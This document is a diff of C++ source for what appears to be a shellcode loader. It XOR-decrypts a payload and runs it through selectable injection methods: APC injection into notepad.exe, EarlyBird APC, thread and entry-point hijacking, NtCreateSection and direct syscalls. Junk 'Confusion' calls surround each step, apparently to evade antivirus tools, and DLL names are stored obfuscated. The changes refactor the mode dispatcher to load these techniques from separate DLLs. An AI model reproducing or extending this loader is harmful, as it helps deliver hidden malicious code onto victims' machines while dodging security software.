@@ -83,7 +83,7 @@ void Launch::func6N_XOR(long long int &diff, std::string &encryptedData) {
         auto byteLength = decryptedDate.length();
 
 //        this->launchFunction(function_mode, decryptedData, byteLength);
-        this->launchFunctionV2(function_mode, decryptedData, byteLength);
+        this->launchFunction(function_mode, decryptedData, byteLength);
     } else {
         std::cout << "Invalid random value!" << std::endl;
     }
@@ -110,118 +110,122 @@ void Launch::funcFile_XOR(string &encryptedData) {
 
 }
 
-void Launch::launchFunction(std::string function_mode, const unsigned char *decryptedData, size_t &byteLength) {
-    if (function_mode == "1") {
-        Confusion::generateAndSortArray();
-        this->printMode("Function 1");
-        this->startBase(MasterEncoderForDirectlyLoader::function1, decryptedData, byteLength);
-        Confusion::generateAndSortArray();
-    } else if (function_mode == "2") {
-        Confusion::generateAndSortArray();
-        this->printMode("Function 2");
-        this->startBase(MasterEncoderForApcLoader::function1, decryptedData, byteLength, "notepad.exe");
-        Confusion::generateAndSortArray();
-        while (true) {
-
-        }
-    } else if (function_mode == "3") {
-        Confusion::generateAndSortArray();
-        this->printMode("Function 3");
-        this->startBase(MasterEncoderForCreateThreatPoolWaitLoader::function1, decryptedData, byteLength);
-        Confusion::generateAndSortArray();
-    } else if (function_mode == "4") {
-        Confusion::generateAndSortArray();
-        this->printMode("Function 4");
-        this->startBase(MasterEncoderForDynamicLoader::function1, decryptedData, byteLength);
-        Confusion::generateAndSortArray();
-    } else if (function_mode == "5") {
-        Confusion::generateAndSortArray();
-        this->printMode("Function 5");
-        this->startBase(MasterEncoderForDynamicLoadPlus::function1, decryptedData, byteLength);
-        Confusion::generateAndSortArray();
-    } else if (function_mode == "6") {
-        Confusion::generateAndSortArray();
-        this->printMode("Function 6");
-        this->startBase(MasterEncoderForEarlyBirdAPC_InjetcLoad::function1, decryptedData, byteLength);
-        Confusion::generateAndSortArray();
-    } else if (function_mode == "7") {
-        Confusion::generateAndSortArray();
-        this->printMode("Function 7");
-        this->startBase(MasterEncoderForFiberLoad::function1, decryptedData, byteLength);
-        Confusion::generateAndSortArray();
-    } else if (function_mode == "8") {
-        Confusion::generateAndSortArray();
-        this->printMode("Function 8");
-        this->startBase(MasterEncoderForNtCreateSectionLoad::function1, decryptedData, byteLength);
-        Confusion::generateAndSortArray();
-        while (true) {
-
-        }
-    } else if (function_mode == "9") {
-        Confusion::generateAndSortArray();
-        this->printMode("Function 9");
-        this->startBase(MasterEncoderForNtTestAlertLoad::function1, decryptedData, byteLength);
-        Confusion::generateAndSortArray();
-    } else if (function_mode == "10") {
-        Confusion::generateAndSortArray();
-        this->printMode("Function 10");
-        this->startBase(MasterEncoderForOEPHiijackInjectLoad::function1, decryptedData, byteLength);
-        Confusion::generateAndSortArray();
-    } else if (function_mode == "11") {
-        Confusion::generateAndSortArray();
-        this->printMode("Function 11");
-        this->startBase(MasterEncoderForSEHExceptLoad::function1, decryptedData, byteLength);
-        Confusion::generateAndSortArray();
-    } else if (function_mode == "12") {
-        Confusion::generateAndSortArray();
-        this->printMode("Function 12");
-        this->startBase(MasterEncoderForSyscallLoad::function1, decryptedData, byteLength);
-        Confusion::generateAndSortArray();
-    } else if (function_mode == "13") {
-        Confusion::generateAndSortArray();
-        this->printMode("Function 13");
-        this->startBase(MasterEncoderForThreadHiijack_InjectLoad::function1, decryptedData, byteLength);
-        Confusion::generateAndSortArray();
-    } else if (function_mode == "14") {
-        Confusion::generateAndSortArray();
-        this->printMode("Function 14");
-        this->startBase(lib::function1, decryptedData, byteLength);
-        Confusion::generateAndSortArray();
-        std::cout << "Function 14 out" << std::endl;
-        while (true) {
-            Sleep(10000);
-            std::cout << "Function 14 in while_true" << std::endl;
-        }
-    } else {
-        std::cout << "Invalid func mode!" << std::endl;
-        return;
-    }
-}
+/*
+ * 1. discard
+ * 2. The full load mode is discarded and the corresponding load mode is used
+ * */
+//void Launch::launchFunction(std::string function_mode, const unsigned char *decryptedData, size_t &byteLength) {
+//    if (function_mode == "1") {
+//        Confusion::generateAndSortArray();
+//        this->printMode("Function 1");
+//        this->startBase(MasterEncoderForDirectlyLoader::function1, decryptedData, byteLength);
+//        Confusion::generateAndSortArray();
+//    } else if (function_mode == "2") {
+//        Confusion::generateAndSortArray();
+//        this->printMode("Function 2");
+//        this->startBase(MasterEncoderForApcLoader::function1, decryptedData, byteLength, "notepad.exe");
+//        Confusion::generateAndSortArray();
+//        while (true) {
+//
+//        }
+//    } else if (function_mode == "3") {
+//        Confusion::generateAndSortArray();
+//        this->printMode("Function 3");
+//        this->startBase(MasterEncoderForCreateThreatPoolWaitLoader::function1, decryptedData, byteLength);
+//        Confusion::generateAndSortArray();
+//    } else if (function_mode == "4") {
+//        Confusion::generateAndSortArray();
+//        this->printMode("Function 4");
+//        this->startBase(MasterEncoderForDynamicLoader::function1, decryptedData, byteLength);
+//        Confusion::generateAndSortArray();
+//    } else if (function_mode == "5") {
+//        Confusion::generateAndSortArray();
+//        this->printMode("Function 5");
+//        this->startBase(MasterEncoderForDynamicLoadPlus::function1, decryptedData, byteLength);
+//        Confusion::generateAndSortArray();
+//    } else if (function_mode == "6") {
+//        Confusion::generateAndSortArray();
+//        this->printMode("Function 6");
+//        this->startBase(MasterEncoderForEarlyBirdAPC_InjetcLoad::function1, decryptedData, byteLength);
+//        Confusion::generateAndSortArray();
+//    } else if (function_mode == "7") {
+//        Confusion::generateAndSortArray();
+//        this->printMode("Function 7");
+//        this->startBase(MasterEncoderForFiberLoad::function1, decryptedData, byteLength);
+//        Confusion::generateAndSortArray();
+//    } else if (function_mode == "8") {
+//        Confusion::generateAndSortArray();
+//        this->printMode("Function 8");
+//        this->startBase(MasterEncoderForNtCreateSectionLoad::function1, decryptedData, byteLength);
+//        Confusion::generateAndSortArray();
+//        while (true) {
+//
+//        }
+//    } else if (function_mode == "9") {
+//        Confusion::generateAndSortArray();
+//        this->printMode("Function 9");
+//        this->startBase(MasterEncoderForNtTestAlertLoad::function1, decryptedData, byteLength);
+//        Confusion::generateAndSortArray();
+//    } else if (function_mode == "10") {
+//        Confusion::generateAndSortArray();
+//        this->printMode("Function 10");
+//        this->startBase(MasterEncoderForOEPHiijackInjectLoad::function1, decryptedData, byteLength);
+//        Confusion::generateAndSortArray();
+//    } else if (function_mode == "11") {
+//        Confusion::generateAndSortArray();
+//        this->printMode("Function 11");
+//        this->startBase(MasterEncoderForSEHExceptLoad::function1, decryptedData, byteLength);
+//        Confusion::generateAndSortArray();
+//    } else if (function_mode == "12") {
+//        Confusion::generateAndSortArray();
+//        this->printMode("Function 12");
+//        this->startBase(MasterEncoderForSyscallLoad::function1, decryptedData, byteLength);
+//        Confusion::generateAndSortArray();
+//    } else if (function_mode == "13") {
+//        Confusion::generateAndSortArray();
+//        this->printMode("Function 13");
+//        this->startBase(MasterEncoderForThreadHiijack_InjectLoad::function1, decryptedData, byteLength);
+//        Confusion::generateAndSortArray();
+//    } else if (function_mode == "14") {
+//        Confusion::generateAndSortArray();
+//        this->printMode("Function 14");
+//        this->startBase(lib::function1, decryptedData, byteLength);
+//        Confusion::generateAndSortArray();
+//        std::cout << "Function 14 out" << std::endl;
+//        while (true) {
+//            Sleep(10000);
+//            std::cout << "Function 14 in while_true" << std::endl;
+//        }
+//    } else {
+//        std::cout << "Invalid func mode!" << std::endl;
+//        return;
+//    }
+//}
 
 void Launch::printMode(const string &mode) {
     std::cout << "in func: " << mode << std::endl;
 }
 
 void Launch::startBase(startFunction startFunction, const unsigned char *decryptedData, size_t &byteLength) {
-    MasterEncoderForApcLoader::generateAndSortArray();
+    Confusion::generateAndSortArray();
     Confusion::generateAndSortArray();
     Confusion::generateAndTransformArray();
     startFunction(decryptedData, byteLength);
     Confusion::generateAndSortArray();
     Confusion::generateAndTransformArray();
-    MasterEncoderForApcLoader::generateAndSortArray();
+    Confusion::generateAndSortArray();
 
 }
 
 void Launch::startBase(startFunction2 startFunction, const unsigned char *decryptedData, size_t &byteLength,
                        const string &name) {
-    MasterEncoderForApcLoader::generateAndSortArray();
+    Confusion::generateAndSortArray();
     Confusion::generateAndSortArray();
     Confusion::generateAndTransformArray();
     startFunction(decryptedData, byteLength, name);
     Confusion::generateAndSortArray();
     Confusion::generateAndTransformArray();
-    MasterEncoderForApcLoader::generateAndSortArray();
+    Confusion::generateAndSortArray();
 }
 
 dllAndFunction Launch::getDllNameAndFuncName(const string &function_mode) {
@@ -236,55 +240,68 @@ dllAndFunction Launch::getDllNameAndFuncName(const string &function_mode) {
         case 1: {
             dName = R"(}&JW>,+Y?*J=?a^I_K}Q?!`|)"; // DirectlyLoader
             funcName = R"(}&JW>,+Y?*J=?a^I>.(`)";
+            break;
         }
         case 2: {
             dName = R"({.@H;,dO>,+Y:&hF>#dI?&U`)"; // DirectlyLoader
             funcName = R"({.@H:&hF>&"W)";
+            break;
         }
         case 3: {
             dName = R"({b)J<.}J"&FW>,^Y'&hT?^BF/.}=?a^I_K}Q?!`|)"; // DirectlyLoader
             funcName = R"({b)J<.}J"&FW>,^Y'&hT?^BF/.}=?a^I>.(`)";
+            break;
         }
         case 4: {
             dName = R"(}*JS<,ZN<YVT<,{S>&VQ)";
             funcName = R"(}*JS<,ZN<YVT<,}JAE`|)";
+            break;
         }
         case 5: {
             dName = R"(}*JS<,ZN<YVT<,}{?*"X_K}Q?!`|)";
             funcName = R"(}*JS<,ZN<YVT<,}{?*"X)";
+            break;
         }
         case 6: {
             dName = R"(},^W?*J#/.)I{"@$.YJS/K"Y<YVT<,{S>&VQ)";
             funcName = R"(},^W?*J#/.)I{"@$.YJS/K"Y<YVT<,{`)";
+            break;
         }
         case 7: {
             dName = R"(}KJG>.)=?a^I_K}Q?!`|)";
             funcName = R"(}KJG>.)=?a^I)";
+            break;
         }
         case 8: {
             dName = R"(:L}$AK"FB&":>,+Y/,hS:&hF>#dI?&U`)";
             funcName = R"(:L}$AK"FB&":>,+Y/,hS:&hF>!`|)";
+            break;
         }
         case 9: {
             dName = R"(:L}'>.+Y{,VJAL}=?a^I_K}Q?!`|)";
             funcName = R"(:L}'>.+Y{,VJAL}=?a^I)";
+            break;
         }
         case 10: {
             dName = R"(:Y"{;&JN/K^H/Zh)?KNJ<b}=?a^I_K}Q?!`|)";
             funcName = R"(:Y"{;&JN/K^H/YJS/K"HB%VT<,{`)";
+            break;
 
         }
         case 11: {
             dName = R"('Y"(}.FH>.@Y:&hF>#dI?&U`)";
             funcName = R"('Y"(}.FH>.@Y:&hF>!`|)";
+            break;
         }
         case 12: {
             dName = R"('bJX<a^Q?%VT<,{S>&VQ)";
             funcName = R"('bJX<a^Q?%VT<,{`)";
+            break;
         }
         case 13: {
             dName = R"("&FW>,^I;&JN/K^H/Zh)?KNJ<b}=?a^I_K}Q?!`|)";
             funcName = R"("&FW>,^I;&JN/K^H/Zh)?KNJ<b}=?a^I)";
+            break;
         }
         default: {
             dName = R"(}&JW>,+Y?*J=?a^I_K}Q?!`|)"; // DirectlyLoader
@@ -305,11 +322,11 @@ std::string Launch::strXor(const string &data) {
     return temp;
 }
 
-void Launch::launchFunctionV2(std::string function_mode, const unsigned char *decryptedData, size_t &byteLength) {
+void Launch::launchFunction(std::string function_mode, const unsigned char *decryptedData, size_t &byteLength) {
     auto dllAndFuncName = this->getDllNameAndFuncName(function_mode);
     auto dllName = dllAndFuncName.first;
     auto funcName = dllAndFuncName.second;
-
+    auto baseName{"../lib/"};
     if (function_mode == "14") {
         Confusion::generateAndSortArray();
         this->printMode("Function 14");
@@ -321,7 +338,7 @@ void Launch::launchFunctionV2(std::string function_mode, const unsigned char *de
             std::cout << "Function 14 in while_true" << std::endl;
         }
     } else {
-        loadLibrary::runFuncFromDll(dllName, funcName, decryptedData, byteLength);
+        loadLibrary::runFuncFromDll(baseName+dllName, funcName, decryptedData, byteLength);
     }
 }
 
